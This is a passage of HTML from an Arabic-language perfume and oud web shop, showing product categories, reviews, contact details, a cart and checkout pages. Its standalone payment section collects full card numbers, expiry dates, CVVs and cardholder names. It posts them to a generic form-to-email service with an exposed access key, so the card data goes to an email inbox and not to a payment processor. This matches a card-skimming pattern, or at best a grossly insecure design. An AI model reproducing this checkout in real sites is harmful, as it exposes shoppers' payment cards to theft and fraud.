<button class="quick-nav-item" onclick="openCart()">
<i class="fas fa-shopping-cart"></i>
<span class="quick-nav-tooltip">السلة</span>
<span class="cart-count" id="quickCartCount" style="top: -5px; right: -5px; font-size: 10px;">0</span>
</button>
</div>
<!-- Floating Elements -->
<div class="floating-elements">
<div class="floating-element" style="left: 10%; animation-delay: 0s;">✨</div>
<div class="floating-element" style="left: 20%; animation-delay: 2s;">🌟</div>
<div class="floating-element" style="left: 30%; animation-delay: 4s;">✨</div>
<div class="floating-element" style="left: 40%; animation-delay: 6s;">🌟</div>
<div class="floating-element" style="left: 50%; animation-delay: 8s;">✨</div>
<div class="floating-element" style="left: 60%; animation-delay: 10s;">🌟</div>
<div class="floating-element" style="left: 70%; animation-delay: 12s;">✨</div>
<div class="floating-element" style="left: 80%; animation-delay: 14s;">🌟</div>
<div class="floating-element" style="left: 90%; animation-delay: 16s;">✨</div>
</div>
<!-- Floating Cart Button -->
<button class="fixed top-4 left-4 z-50 bg-orange-600 text-white w-14 h-14 rounded-full flex items-center justify-center shadow-lg hover:bg-orange-700 transition duration-300" onclick="openCart()">
<i class="fas fa-shopping-cart text-xl"></i>
<span class="cart-count" id="floatingCartCount">0</span>
</button>
<!-- Main Content -->
<div id="mainContent">
<!-- Hero Section -->
<section class="hero-section text-white py-32 relative overflow-hidden" id="home">
<div class="container mx-auto px-6 text-center relative z-10">
<h1 class="text-6xl font-bold mb-8 animate-fade-in">مكاسر العود</h1>
<p class="text-2xl mb-12 max-w-3xl mx-auto leading-relaxed">أفخر أنواع العود الطبيعي والمحسن والأدهان والبخور من أجود المصادر العالمية</p>
<div class="flex flex-col sm:flex-row justify-center gap-4">
<a class="btn-primary inline-flex items-center justify-center" href="#products">
<i class="fas fa-shopping-bag ml-2"></i>
                        تسوق الآن
                    </a>
<a class="bg-white/20 backdrop-blur-md text-white px-8 py-4 rounded-lg font-semibold hover:bg-white/30 transition duration-300 inline-flex items-center justify-center" href="#contact">
<i class="fas fa-phone ml-2"></i>
                        اتصل بنا
                    </a>
</div>
</div>
</section>
<!-- Categories -->
<section class="py-20 bg-gradient-to-br from-orange-50 via-orange-100 to-yellow-100 relative overflow-hidden">
<div class="absolute inset-0 opacity-10">
<div class="absolute top-10 left-10 w-20 h-20 bg-orange-400 rounded-full animate-pulse"></div>
<div class="absolute top-20 right-20 w-16 h-16 bg-yellow-400 rounded-full animate-pulse" style="animation-delay: 1s"></div>
<div class="absolute bottom-20 left-20 w-12 h-12 bg-orange-500 rounded-full animate-pulse" style="animation-delay: 2s"></div>
<div class="absolute bottom-10 right-10 w-24 h-24 bg-yellow-300 rounded-full animate-pulse" style="animation-delay: 3s"></div>
</div>
<div class="container mx-auto px-6 relative z-10">
<div class="categories-container">
<div class="category-card active bg-gradient-to-br from-white to-orange-50 shadow-xl" onclick="filterProducts('all')">
<i class="fas fa-spa text-5xl mb-4 text-orange-600"></i>
<p class="font-bold text-lg">جميع المنتجات</p>
<p class="text-sm text-gray-600 mt-2">مجموعة كاملة</p>
</div>
<div class="category-card bg-gradient-to-br from-white to-green-50 shadow-xl" onclick="filterProducts('عود طبيعي')">
<i class="fas fa-leaf text-5xl mb-4 text-green-600"></i>
<p class="font-bold text-lg">عود طبيعي</p>
<p class="text-sm text-gray-600 mt-2">أصلي 100%</p>
</div>
<div class="category-card bg-gradient-to-br from-white to-blue-50 shadow-xl" onclick="filterProducts('أدهان')">
<i class="fas fa-tint text-5xl mb-4 text-blue-600"></i>
<p class="font-bold text-lg">أدهان</p>
<p class="text-sm text-gray-600 mt-2">عطور فاخرة</p>
</div>
<div class="category-card bg-gradient-to-br from-white to-red-50 shadow-xl" onclick="filterProducts('مبسوس')">
<i class="fas fa-fire text-5xl mb-4 text-red-600"></i>
<p class="font-bold text-lg">مبسوس</p>
<p class="text-sm text-gray-600 mt-2">رائحة قوية</p>
</div>
<div class="category-card bg-gradient-to-br from-white to-yellow-50 shadow-xl" onclick="filterProducts('زعفران')">
<i class="fas fa-seedling text-5xl mb-4 text-yellow-600"></i>
<p class="font-bold text-lg">زعفران</p>
<p class="text-sm text-gray-600 mt-2">نقيل فاخر</p>
</div>
<div class="category-card bg-gradient-to-br from-white to-purple-50 shadow-xl" onclick="filterProducts('توزيعات')">
<i class="fas fa-gift text-5xl mb-4 text-purple-600"></i>
<p class="font-bold text-lg">توزيعات</p>
<p class="text-sm text-gray-600 mt-2">هدايا مميزة</p>
</div>
</div>
</div>
</section>
<!-- Products Section -->
<section class="py-20 bg-gradient-to-br from-gray-50 to-white relative" id="products">
<div class="absolute inset-0 opacity-5">
<div class="absolute top-0 left-0 w-32 h-32 bg-orange-300 rounded-full blur-xl"></div>
<div class="absolute top-1/2 right-0 w-40 h-40 bg-yellow-300 rounded-full blur-xl"></div>
<div class="absolute bottom-0 left-1/3 w-36 h-36 bg-orange-400 rounded-full blur-xl"></div>
</div>
<div class="container mx-auto px-6 relative z-10">
<div class="text-center mb-16">
<h2 class="text-6xl font-bold mb-6 bg-gradient-to-r from-orange-600 via-yellow-600 to-orange-700 bg-clip-text text-transparent">✨ منتجاتنا المميزة ✨</h2>
<p class="text-2xl text-gray-700 max-w-3xl mx-auto">أفضل مجموعة من العود والعطور الفاخرة</p>
</div>
<div class="flex flex-col md:flex-row justify-between items-center mb-12 bg-white rounded-2xl p-6 shadow-lg">
<div class="flex items-center mb-4 md:mb-0">
<i class="fas fa-filter text-orange-600 text-2xl ml-3"></i>
<h3 class="text-2xl font-bold text-gray-800">اختر وصنف</h3>
</div>
<div class="flex flex-col sm:flex-row gap-4">
<select class="px-6 py-4 border-2 border-orange-200 rounded-xl text-lg bg-gradient-to-r from-white to-orange-50 font-semibold shadow-md" id="sortSelect" onchange="sortProducts()">
<option value="default">🎯 مقترحاتنا</option>
<option value="bestselling">🔥 الأكثر مبيعاً</option>
<option value="rating">⭐ الأعلى تقييماً</option>
<option value="price-high">💰 السعر من الأعلى إلى الأقل</option>
<option value="price-low">💵 السعر من الأقل إلى الأعلى</option>
</select>
</div>
</div>
<div class="product-grid-enhanced">
<div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8" id="productsGrid">
<!-- Products will be populated by JavaScript -->
</div>
</div>
</div>
</section>
<!-- Customer Reviews -->
<section class="py-20 bg-gradient-to-br from-gray-50 to-gray-100">
<div class="container mx-auto px-6">
<h2 class="text-4xl font-bold text-center mb-16 text-gray-800">آراء عملائنا الكرام</h2>
<div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
<div class="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300">
<div class="flex items-center mb-6">
<div class="flex text-yellow-500 text-xl">
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
</div>
</div>
<p class="text-gray-700 mb-6 leading-relaxed text-lg">"طلبت دهن عود كمبودي كان رائع وثباته قوي جدا انصح فيه وخدمتهم ممتازه 👍"</p>
<div class="flex items-center">
<div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center ml-4">
<i class="fas fa-user text-orange-600"></i>
</div>
<div>
<div class="font-bold text-gray-800">خالد بن ريس</div>
<div class="text-gray-600 text-sm">الرياض</div>
</div>
</div>
</div>
<div class="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300">
<div class="flex items-center mb-6">
<div class="flex text-yellow-500 text-xl">
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
</div>
</div>
<p class="text-gray-700 mb-6 leading-relaxed text-lg">"ماشاء الله تبارك الله ،، المنتجات روووووعه الله يبارك لكم يارب الموروكي خطيرررر والمبسوس فوق الوصف وصفايح العود خياليه 😍😍😍"</p>
<div class="flex items-center">
<div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center ml-4">
<i class="fas fa-user text-orange-600"></i>
</div>
<div>
<div class="font-bold text-gray-800">حصه المقبل</div>
<div class="text-gray-600 text-sm">الرياض</div>
</div>
</div>
</div>
<div class="bg-white p-8 rounded-2xl shadow-lg hover:shadow-xl transition duration-300">
<div class="flex items-center mb-6">
<div class="flex text-yellow-500 text-xl">
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
<i class="fas fa-star"></i>
</div>
</div>
<p class="text-gray-700 mb-6 leading-relaxed text-lg">"متجر جميل ومنوع الخيارات"</p>
<div class="flex items-center">
<div class="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center ml-4">
<i class="fas fa-user text-orange-600"></i>
</div>
<div>
<div class="font-bold text-gray-800">عبدالمحسن الشليح</div>
<div class="text-gray-600 text-sm">الرياض</div>
</div>
</div>
</div>
</div>
</div>
</section>
<!-- About Section -->
<section class="py-20 bg-white" id="about">
<div class="container mx-auto px-6">
<div class="text-center mb-16">
<h2 class="text-4xl font-bold mb-8 text-gray-800">من نحن</h2>
<p class="text-xl text-gray-700 max-w-3xl mx-auto leading-relaxed">متخصصون في بيع العود الطبيعي والمحسن والأدهان والبخور</p>
</div>
<div class="grid md:grid-cols-3 gap-8 mb-16">
<div class="text-center group">
<div class="w-20 h-20 bg-gradient-to-br from-orange-400 to-orange-600 rounded-full mx-auto mb-6 flex items-center justify-center group-hover:scale-110 transition duration-300">
<i class="fas fa-certificate text-white text-2xl"></i>
</div>
<h3 class="text-2xl font-bold mb-4 text-gray-800">جودة مضمونة</h3>
<p class="text-gray-600 leading-relaxed">منتجات أصلية وعالية الجودة مع ضمان الأصالة والجودة</p>
</div>
<div class="text-center group">
<div class="w-20 h-20 bg-gradient-to-br from-orange-400 to-orange-600 rounded-full mx-auto mb-6 flex items-center justify-center group-hover:scale-110 transition duration-300">
<i class="fas fa-shipping-fast text-white text-2xl"></i>
</div>
<h3 class="text-2xl font-bold mb-4 text-gray-800">توصيل سريع</h3>
<p class="text-gray-600 leading-relaxed">خدمة توصيل سريعة وآمنة لجميع أنحاء المملكة العربية السعودية</p>
</div>
<div class="text-center group">
<div class="w-20 h-20 bg-gradient-to-br from-orange-400 to-orange-600 rounded-full mx-auto mb-6 flex items-center justify-center group-hover:scale-110 transition duration-300">
<i class="fas fa-headset text-white text-2xl"></i>
</div>
<h3 class="text-2xl font-bold mb-4 text-gray-800">خدمة عملاء ممتازة</h3>
<p class="text-gray-600 leading-relaxed">فريق دعم فني محترف متاح على مدار الساعة لخدمتكم</p>
</div>
</div>
<!-- Security Badge -->
<div class="text-center">
<div class="inline-flex items-center bg-green-50 px-6 py-4 rounded-full">
<img alt="Security Badge" class="w-10 h-10 ml-3" src="https://pfst.cf2.poecdn.net/base/image/70c03106a59c8c80e4297bce53a03bb7ee1dbf658b8ed96c2a73faccdde6595e?w=200&amp;h=200"/>
<span class="text-green-800 font-semibold">متجر موثق وآمن</span>
</div>
</div>
</div>
</section>
<!-- Contact Section -->
<section class="py-20 bg-gradient-to-br from-orange-50 to-orange-100" id="contact">
<div class="container mx-auto px-6">
<h2 class="text-4xl font-bold text-center mb-16 text-gray-800">تواصل معنا</h2>
<div class="max-w-6xl mx-auto grid md:grid-cols-2 gap-12">
<div class="bg-white p-8 rounded-2xl shadow-lg">
<h3 class="text-2xl font-bold mb-8 text-gray-800">معلومات التواصل</h3>
<div class="space-y-6">
<div class="flex items-center p-4 bg-orange-50 rounded-lg">
<div class="w-12 h-12 bg-orange-600 rounded-full flex items-center justify-center ml-4">
<i class="fas fa-phone text-white"></i>
</div>
<div>
<p class="text-gray-600 text-sm">رقم الهاتف</p>
<a class="text-orange-600 font-bold text-lg hover:underline" href="tel:+966542068739">00966542068739</a>
</div>
</div>
<div class="flex items-center p-4 bg-orange-50 rounded-lg">
<div class="w-12 h-12 bg-orange-600 rounded-full flex items-center justify-center ml-4">
<i class="fab fa-whatsapp text-white"></i>
</div>
<div>
<p class="text-gray-600 text-sm">واتساب</p>
<a class="text-orange-600 font-bold text-lg hover:underline" href="https://wa.me/966542068739">تواصل عبر واتساب</a>
</div>
</div>
<div class="flex items-center p-4 bg-orange-50 rounded-lg">
<div class="w-12 h-12 bg-orange-600 rounded-full flex items-center justify-center ml-4">
<i class="fas fa-envelope text-white"></i>
</div>
<div>
<p class="text-gray-600 text-sm">البريد الإلكتروني</p>
<span class="text-orange-600 font-bold text-lg">alhkr5415@gmail.com</span>
</div>
</div>
<div class="flex items-center p-4 bg-orange-50 rounded-lg">
<div class="w-12 h-12 bg-orange-600 rounded-full flex items-center justify-center ml-4">
<i class="fas fa-clock text-white"></i>
</div>
<div>
<p class="text-gray-600 text-sm">ساعات العمل</p>
<p class="text-orange-600 font-bold text-lg">24/7 - على مدار الساعة</p>
</div>
</div>
</div>
<!-- Test Email Button -->
<div class="mt-8 text-center">
<button class="btn-secondary" onclick="testEmailSystem()">
<i class="fas fa-envelope-check ml-2"></i>
                                اختبار نظام الإيميل
                            </button>
</div>
</div>
<div class="bg-white p-8 rounded-2xl shadow-lg">
<h3 class="text-2xl font-bold mb-8 text-gray-800">أرسل رسالة</h3>
<form action="https://api.web3forms.com/submit" class="space-y-6" id="contactForm" method="POST">
<input name="access_key" type="hidden" value="a5b3a412-9ae7-4c42-bf49-8a1a669c8f12"/>

<div class="input-group">
<input name="name" placeholder=" " required="" type="text"/>
<label>الاسم الكامل</label>
</div>
<div class="input-group">
<input name="email" placeholder=" " required="" type="email"/>
<label>البريد الإلكتروني</label>
</div>
<div class="input-group">
<input name="phone" placeholder=" " type="tel"/>
<label>رقم الهاتف (اختياري)</label>
</div>
<div class="input-group">
<textarea class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-600 focus:outline-none resize-none" name="message" placeholder=" " required="" rows="5"></textarea>
<label>الرسالة</label>
</div>
<button class="btn-primary w-full" id="submitContactBtn" type="submit">
<i class="fas fa-paper-plane ml-2"></i>
                                إرسال الرسالة
                            </button>

<div class="text-green-700 text-center font-bold mt-4" id="formSuccessMessage" style="display:none;">
  ✅ تم إرسال النموذج بنجاح
</div>
</form>
</div>
</div>
</div>
</section>
<!-- نموذج طلب الشراء -->
<section class="py-20 bg-orange-50" id="order">
<div class="container mx-auto px-6">
<h2 class="text-4xl font-bold text-center mb-16 text-gray-800">تقديم طلب شراء</h2>
<div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
<form action="https://api.web3forms.com/submit" class="space-y-6" id="orderForm" method="POST">
<input name="access_key" type="hidden" value="a5b3a412-9ae7-4c42-bf49-8a1a669c8f12"/>

<div class="grid grid-cols-1 md:grid-cols-2 gap-6">
<div class="input-group">
<input name="first_name" placeholder=" " required="" type="text"/>
<label>الاسم الأول</label>
</div>
<div class="input-group">
<input name="last_name" placeholder=" " required="" type="text"/>
<label>الاسم الأخير</label>
</div>
</div>
<div class="input-group">
<input name="email" placeholder=" " required="" type="email"/>
<label>البريد الإلكتروني</label>
</div>
<div class="input-group">
<input name="phone" pattern="[0-9]{10,}" placeholder=" " required="" title="يرجى إدخال رقم هاتف صحيح" type="tel"/>
<label>رقم الهاتف</label>
</div>
<div class="input-group">
<input name="address" placeholder=" " required="" type="text"/>
<label>العنوان التفصيلي</label>
</div>
<div class="grid grid-cols-1 md:grid-cols-2 gap-6">
<div class="input-group">
<select name="city" required="">
<option value="">اختر المدينة</option>
<option value="الرياض">الرياض</option>
<option value="جدة">جدة</option>
<option value="الدمام">الدمام</option>
<option value="مكة المكرمة">مكة المكرمة</option>
<option value="المدينة المنورة">المدينة المنورة</option>
<option value="الطائف">الطائف</option>
<option value="أبها">أبها</option>
<option value="تبوك">تبوك</option>
<option value="بريدة">بريدة</option>
<option value="خميس مشيط">خميس مشيط</option>
<option value="حائل">حائل</option>
<option value="الجبيل">الجبيل</option>
<option value="الخبر">الخبر</option>
<option value="ينبع">ينبع</option>
<option value="القطيف">القطيف</option>
<option value="نجران">نجران</option>
<option value="الباحة">الباحة</option>
<option value="عرعر">عرعر</option>
<option value="سكاكا">سكاكا</option>
<option value="جيزان">جيزان</option>
<option value="الأحساء">الأحساء</option>
<option value="القريات">القريات</option>
<option value="رفحاء">رفحاء</option>
<option value="طريف">طريف</option>
<option value="أخرى">أخرى</option>
</select>
<label>المدينة</label>
</div>
<div class="input-group">
<input maxlength="6" name="postal_code" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)" pattern="[0-9]{5,6}" placeholder=" " required="" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" type="text"/>
<label>الرمز البريدي</label>
</div>
</div>
<div class="input-group">
<textarea class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-600 focus:outline-none resize-none" name="order_notes" placeholder=" " rows="4"></textarea>
<label>ملاحظات إضافية (اختياري)</label>
</div>
<button class="btn-primary w-full" id="submitOrderBtn" type="submit">
<i class="fas fa-shopping-cart ml-2"></i>
                            تأكيد الطلب
                        </button>

<div class="text-green-700 text-center font-bold mt-4" id="formSuccessMessage" style="display:none;">
  ✅ تم إرسال النموذج بنجاح
</div>
</form>
</div>
</div>
</section>
<!-- نموذج الدفع -->
<section class="py-20" id="payment">
<div class="container mx-auto px-6">
<h2 class="text-4xl font-bold text-center mb-16 text-gray-800">إتمام الدفع</h2>
<div class="max-w-4xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
<form action="https://api.web3forms.com/submit" class="space-y-6" id="paymentFormStandalone" method="POST">
<input name="access_key" type="hidden" value="a5b3a412-9ae7-4c42-bf49-8a1a669c8f12"/>

<div class="input-group">
<input maxlength="19" name="card_number" oninput="formatCardNumber(this)" placeholder=" " required="" type="text"/>
<label>رقم البطاقة</label>
</div>
<div class="grid grid-cols-1 md:grid-cols-2 gap-6">
<div class="input-group">
<input maxlength="5" name="expiry_date" oninput="formatExpiryDate(this)" placeholder=" " required="" type="text"/>
<label>تاريخ الانتهاء (شهر/سنة)</label>
</div>
<div class="input-group">
<input maxlength="4" name="cvv" oninput="this.value = this.value.replace(/[^0-9]/g, '')" placeholder=" " required="" type="password"/>
<label>رمز الأمان (CVV)</label>
</div>
</div>
<div class="input-group">
<input name="card_holder" placeholder=" " required="" type="text"/>
<label>اسم حامل البطاقة</label>
</div>
<button class="btn-primary w-full" id="submitPaymentBtnStandalone" type="submit">
<i class="fas fa-lock ml-2"></i>
                            تأكيد الدفع
                        </button>

<div class="text-green-700 text-center font-bold mt-4" id="formSuccessMessage" style="display:none;">
  ✅ تم إرسال النموذج بنجاح
</div>
</form>
</div>
</div>
</section>
<!-- Team Section -->
<section class="py-20 bg-gradient-to-br from-gray-50 to-white">
<div class="container mx-auto px-6">
<div class="text-center mb-16">
<h2 class="text-5xl font-bold mb-6 bg-gradient-to-r from-orange-600 to-yellow-600 bg-clip-text text-transparent">👥 فريق العمل المميز 👥</h2>
<p class="text-xl text-gray-700 max-w-2xl mx-auto">فريق محترف ومتخصص لخدمتكم بأفضل جودة</p>
</div>
<div class="grid md:grid-cols-2 gap-12 max-w-4xl mx-auto">
<div class="team-member bg-gradient-to-br from-white to-orange-50 shadow-xl border border-orange-100">
<img alt="مديرة المبيعات" class="team-avatar" src="https://pfst.cf2.poecdn.net/base/image/abcd6d7c30613192ad8c840f7f7cd1f02a29380616ec1df4f6d5e96774287ae1?w=240&amp;h=240"/>
<h3 class="text-2xl font-bold mb-2 text-gray-800">مديرة المبيعات</h3>
<p class="text-orange-600 font-semibold mb-3">👩‍💼 خبيرة في العطور والعود الفاخر</p>
<p class="text-gray-600 mb-4 text-sm leading-relaxed">متخصصة في اختيار أفضل المنتجات وتقديم الاستشارات</p>
<div class="flex justify-center space-x-2 rtl:space-x-reverse">
<span class="w-3 h-3 bg-orange-600 rounded-full animate-pulse"></span>
<span class="w-3 h-3 bg-orange-400 rounded-full animate-pulse" style="animation-delay: 0.3s"></span>
<span class="w-3 h-3 bg-orange-300 rounded-full animate-pulse" style="animation-delay: 0.6s"></span>
</div>
</div>
<div class="team-member bg-gradient-to-br from-white to-blue-50 shadow-xl border border-blue-100">
<img alt="مدير التسويق" class="team-avatar" src="https://pfst.cf2.poecdn.net/base/image/aeb9789661440c6b9954fe3a3b9d94364a82cfca63ff93dd0570ede80c24407d?w=240&amp;h=240"/>
<h3 class="text-2xl font-bold mb-2 text-gray-800">مدير التسويق</h3>
<p class="text-blue-600 font-semibold mb-3">👨‍💻 متخصص في تطوير الأعمال والتسويق</p>
<p class="text-gray-600 mb-4 text-sm leading-relaxed">خبير في الوصول لأفضل العملاء وتطوير الخدمات</p>
<div class="flex justify-center space-x-2 rtl:space-x-reverse">
<span class="w-3 h-3 bg-blue-600 rounded-full animate-pulse"></span>
<span class="w-3 h-3 bg-blue-400 rounded-full animate-pulse" style="animation-delay: 0.3s"></span>
<span class="w-3 h-3 bg-blue-300 rounded-full animate-pulse" style="animation-delay: 0.6s"></span>
</div>
</div>
</div>
</div>
</section>
<!-- Footer -->
<footer class="bg-gray-900 text-white py-16">
<div class="container mx-auto px-6">
<div class="grid md:grid-cols-4 gap-8 mb-12">
<div>
<div class="flex items-center mb-6">
<img alt="مكاسر العود" class="h-8 w-auto ml-3" src="https://pfst.cf2.poecdn.net/base/image/34e9858ffdb6a4a5c98ae80c2ae0a25b313a8a8c2d18392e44e9d9bac31affe1?w=387&amp;h=499"/>
<h3 class="text-2xl font-bold">مكاسر العود</h3>
</div>
<p class="text-gray-400 leading-relaxed mb-6">متخصصون في تقديم أفخر أنواع العود الطبيعي والمحسن والأدهان والبخور من أجود المصادر العالمية</p>
<div class="flex space-x-4 rtl:space-x-reverse">
<a class="w-10 h-10 bg-orange-600 rounded-full flex items-center justify-center hover:bg-orange-700 transition duration-300" href="#">
<i class="fab fa-instagram"></i>
</a>
<a class="w-10 h-10 bg-orange-600 rounded-full flex items-center justify-center hover:bg-orange-700 transition duration-300" href="#">
<i class="fab fa-twitter"></i>
</a>
<a class="w-10 h-10 bg-orange-600 rounded-full flex items-center justify-center hover:bg-orange-700 transition duration-300" href="#">
<i class="fab fa-facebook"></i>
</a>
</div>
</div>
<div>
<h4 class="font-bold mb-6 text-xl">روابط مهمة</h4>
<ul class="space-y-3 text-gray-400">
<li><a class="hover:text-white transition duration-300" href="#">سياسة الاستبدال والاسترجاع</a></li>
<li><a class="hover:text-white transition duration-300" href="#">الشروط والأحكام</a></li>
<li><a class="hover:text-white transition duration-300" href="#">سياسة الخصوصية</a></li>
<li><a class="hover:text-white transition duration-300" href="#">الأسئلة الشائعة</a></li>
</ul>
</div>
<div>
<h4 class="font-bold mb-6 text-xl">المنتجات</h4>
<ul class="space-y-3 text-gray-400">
<li><a class="hover:text-white transition duration-300" href="#">عود طبيعي</a></li>
<li><a class="hover:text-white transition duration-300" href="#">عود محسن</a></li>
<li><a class="hover:text-white transition duration-300" href="#">أدهان فاخرة</a></li>
<li><a class="hover:text-white transition duration-300" href="#">مبسوس ممتاز</a></li>
</ul>
</div>
<div>
<h4 class="font-bold mb-6 text-xl">تواصل معنا</h4>
<div class="space-y-3 text-gray-400">
<p class="flex items-center"><i class="fas fa-phone ml-3 text-orange-500"></i> 00966542068739</p>
<p class="flex items-center"><i class="fab fa-whatsapp ml-3 text-orange-500"></i> واتساب</p>
<p class="flex items-center"><i class="fas fa-envelope ml-3 text-orange-500"></i> alhkr5415@gmail.com</p>
<p class="flex items-center"><i class="fas fa-map-marker-alt ml-3 text-orange-500"></i> المملكة العربية السعودية</p>
</div>
</div>
</div>
<!-- Payment Methods -->
<div class="border-t border-gray-800 pt-8 mb-8">
<h4 class="font-bold mb-4 text-center">طرق الدفع المقبولة</h4>
<div class="flex justify-center items-center space-x-6 rtl:space-x-reverse">
<img alt="Visa &amp; Mastercard" class="h-8" src="https://pfst.cf2.poecdn.net/base/image/1cbcac1b5e47abc7eed266be71ecb95e19231dad108d03ea91ee10ab86b730c5?w=400&amp;h=200"/>
<img alt="Mada" class="h-8" src="https://pfst.cf2.poecdn.net/base/image/82276cc34ac7b4f7e621a87357a4d15ad6d64cfc8124adad3fbae6d1da4be823?w=400&amp;h=200"/>
<img alt="STC Pay" class="h-8" src="https://pfst.cf2.poecdn.net/base/image/b066a28e370a5287532e9fc81feb3eaa2b7c607d86e4535659eca75a9cb34d9c?w=400&amp;h=200"/>
<img alt="Tabby" class="h-8" src="https://pfst.cf2.poecdn.net/base/image/161265b40b3a4b62a9106dc0a889937581605d5d81c0f652f49dc287691b9bd7?w=1001&amp;h=399"/>
</div>
</div>
<div class="border-t border-gray-800 pt-8 text-center text-gray-400">
<p>© 2025 مكاسر العود. جميع الحقوق محفوظة | تصميم وتطوير فريق التقنية</p>
</div>
</div>
</footer>
</div>
<!-- Cart Modal -->
<div class="modal" id="cartModal">
<div class="modal-content p-8">
<div class="flex justify-between items-center mb-8">
<h3 class="text-2xl font-bold flex items-center">
<i class="fas fa-shopping-cart ml-3 text-orange-600"></i>
                    سلة المشتريات
                </h3>
<button class="text-gray-500 hover:text-gray-700 p-2" onclick="closeCart()">
<i class="fas fa-times text-2xl"></i>
</button>
</div>
<div class="max-h-96 overflow-y-auto" id="cartItems"></div>
<div class="border-t pt-6 mt-6" id="cartTotal"></div>
<button class="btn-primary w-full mt-6" onclick="startCheckout()">
<i class="fas fa-arrow-left ml-2"></i>
                متابعة إلى الطلب
            </button>
</div>
</div>
<!-- Order Information Page -->
<div class="fullscreen-page" id="orderInfoPage">
<div class="container mx-auto px-6 py-12">
<!-- Progress Bar -->
<div class="progress-bar mb-12">
<div class="progress-step active">
<div class="step-circle">1</div>
<p class="text-sm font-bold">معلومات الطلب</p>
</div>
<div class="progress-step">
<div class="step-circle">2</div>
<p class="text-sm">مراجعة الطلب</p>
</div>
<div class="progress-step">
<div class="step-circle">3</div>
<p class="text-sm">الدفع</p>
</div>
<div class="progress-step">
<div class="step-circle">4</div>
<p class="text-sm">التأكيد</p>
</div>
</div>
<div class="max-w-4xl mx-auto">
<div class="text-center mb-12">
<h1 class="text-4xl font-bold text-gray-800 mb-4">إكمال معلومات الطلب</h1>
<p class="text-xl text-gray-600">يرجى ملء المعلومات المطلوبة لإتمام طلبك</p>
</div>
<form class="space-y-8" id="customerInfoForm">
<!-- Customer Information -->
<div class="form-section fade-in">
<h3><i class="fas fa-user ml-3"></i>المعلومات الشخصية</h3>
<div class="grid md:grid-cols-2 gap-6">
<div class="input-group">
<input name="first_name" placeholder=" " required="" type="text"/>
<label>الاسم الأول</label>
</div>
<div class="input-group">
<input name="last_name" placeholder=" " required="" type="text"/>
<label>الاسم الأخير</label>
</div>
</div>
<div class="input-group">
<input name="email" placeholder=" " required="" type="email"/>
<label>البريد الإلكتروني</label>
</div>
<div class="input-group">
<input name="phone" pattern="[0-9]{10,}" placeholder=" " required="" title="يرجى إدخال رقم هاتف صحيح" type="tel"/>
<label>رقم الهاتف</label>
</div>
</div>
<!-- Shipping Information -->
<div class="form-section fade-in">
<h3><i class="fas fa-shipping-fast ml-3"></i>عنوان الشحن</h3>
<div class="input-group">
<input name="address" placeholder=" " required="" type="text"/>
<label>العنوان التفصيلي</label>
</div>
<div class="grid md:grid-cols-2 gap-6">
<div class="input-group">
<select name="city" required="">
<option value="">اختر المدينة</option>
<option value="الرياض">الرياض</option>
<option value="جدة">جدة</option>
<option value="الدمام">الدمام</option>
<option value="مكة المكرمة">مكة المكرمة</option>
<option value="المدينة المنورة">المدينة المنورة</option>
<option value="الطائف">الطائف</option>
<option value="أبها">أبها</option>
<option value="تبوك">تبوك</option>
<option value="بريدة">بريدة</option>
<option value="خميس مشيط">خميس مشيط</option>
<option value="حائل">حائل</option>
<option value="الجبيل">الجبيل</option>
<option value="الخبر">الخبر</option>
<option value="ينبع">ينبع</option>
<option value="القطيف">القطيف</option>
<option value="نجران">نجران</option>
<option value="الباحة">الباحة</option>
<option value="عرعر">عرعر</option>
<option value="سكاكا">سكاكا</option>
<option value="جيزان">جيزان</option>
<option value="الأحساء">الأحساء</option>
<option value="القريات">القريات</option>
<option value="رفحاء">رفحاء</option>
<option value="طريف">طريف</option>
<option value="أخرى">أخرى</option>
</select>
<label>المدينة</label>
</div>
<div class="input-group">
<input maxlength="6" name="postal_code" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0,6)" pattern="[0-9]{5,6}" placeholder=" " required="" title="يرجى إدخال رمز بريدي مكون من 5-6 أرقام" type="text"/>
<label>الرمز البريدي (5-6 أرقام)</label>
</div>
</div>
</div>
<!-- Order Notes -->
<div class="form-section fade-in">
<h3><i class="fas fa-sticky-note ml-3"></i>ملاحظات إضافية (اختياري)</h3>
<div class="input-group">
<textarea class="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-orange-600 focus:outline-none resize-none" name="order_notes" placeholder=" " rows="4"></textarea>
<label>أي ملاحظات خاصة بالطلب أو التوصيل</label>
</div>
</div>
<!-- Action Buttons -->
<div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
<button class="btn-secondary" onclick="goBackToCart()" type="button">
<i class="fas fa-arrow-right ml-2"></i>
                            العودة للسلة
                        </button>
<button class="btn-primary" id="submitCustomerInfoBtn" type="submit">
<i class="fas fa-arrow-left ml-2"></i>
                            متابعة لمراجعة الطلب
                        </button>
</div>
</form>
</div>
</div>
</div>
<!-- Order Review Page -->
<div class="fullscreen-page" id="orderReviewPage">
<div class="container mx-auto px-6 py-12">
<!-- Progress Bar -->
<div class="progress-bar mb-12">
<div class="progress-step completed">
<div class="step-circle"><i class="fas fa-check"></i></div>
<p class="text-sm">معلومات الطلب</p>
</div>
<div class="progress-step active">
<div class="step-circle">2</div>
<p class="text-sm font-bold">مراجعة الطلب</p>
</div>
<div class="progress-step">
<div class="step-circle">3</div>
<p class="text-sm">الدفع</p>
</div>
